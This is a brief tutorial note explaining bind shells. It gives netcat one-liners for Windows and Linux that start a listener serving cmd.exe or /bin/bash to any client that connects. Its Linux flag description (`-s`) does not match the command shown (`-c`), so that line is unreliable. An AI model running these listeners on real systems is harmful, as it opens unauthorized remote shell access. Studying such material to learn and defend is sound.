
## **Intro to Bind Shell**

A bind shell is a sort of setup where remote consoles are established with other computers over the network. In Bind shell, an attacker launches a service on the target computer, to which the attacker can connect. In a bind shell, an attacker can connect to the target computer and execute commands on the target computer. To launch a bind shell, the attacker must have the IP address of the victim to access the target computer.


> Basically: A bind shell is a type of remote shell where the attacker connects to a listener on the target system.


---
# **Setup a Bind Shell:**

On a windows system:
>`-e` used to specify a program to be executed when anyone connect to this listener... 

	nc.exe -nvlp 7777 -e cmd.exe



On a Linux system:
> `-s` Used to specify a shell to be executed when anyone connect to this Listener...

	nc -nvlp 1234 -c /bin/bash
